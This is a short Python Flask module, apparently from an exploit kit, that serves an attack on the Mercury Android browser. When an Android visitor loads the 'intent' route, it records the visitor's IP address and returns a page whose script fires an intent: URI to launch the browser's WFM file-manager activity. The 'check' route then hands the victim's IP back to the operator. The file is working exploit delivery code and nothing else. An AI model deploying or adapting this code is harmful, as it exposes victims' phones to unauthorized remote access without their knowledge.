import os
from . import src
from flask import request


@src.route('/exploits/mercury/wfm/<method>')
def exploit_mercury(method):

    """
    Exploit Description

    Browser Version
    """
    if method == "intent":
        with open("mercury.log", "w+") as f:
            print(request.headers.get("User-Agent"))
            if "Android" in request.headers.get("User-Agent"):
                f.write("".join("ip:{0}".format(request.remote_addr)))
                f.close()

                response = """

                    <html>
                        <head>
                            <meta charset="utf-8" />
                        </head>
                        <body>
                            <script>
                                location.href="intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";
                            </script>
                        </body>
                    </html>

                """

                return response

    if method == "check":
        try:
            with open("mercury.log", "r") as f:
                if f:
                    ip = f.readline().split(":")[1]
                    f.close()
                    os.remove("mercury.log")
                    return ip
                else:
                    response = "Not Engaged"
                    return response
        except IOError:
            response = "Not Engaged"
            return response
